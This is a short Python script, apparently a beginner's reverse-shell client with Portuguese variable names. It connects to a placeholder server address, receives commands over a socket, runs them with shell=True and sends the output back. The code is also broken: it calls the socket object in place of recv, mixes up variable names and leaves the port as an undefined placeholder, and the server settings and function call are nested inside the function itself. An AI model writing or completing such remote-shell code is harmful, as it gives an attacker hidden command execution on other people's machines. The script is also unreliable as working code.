import socket
import subprocess 

def conectando_ao_server(server_ip, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    while True:
        comando = client_socket(1024).decode 

        if command.lower() == "exit":
            break
        
        saida_comandos= subprocess.run(comando, shell=True, capture_output=True, text=True)
        client_socket.send(saida_comandos.stdout.encode() + output.stderr.encode())
    client_socket.close()

    server_ip = "IP_DO_SERVIDOR"
    server_port = PORTA_DO_SERVIDOR

    conectando_ao_server(server_ip, server_port)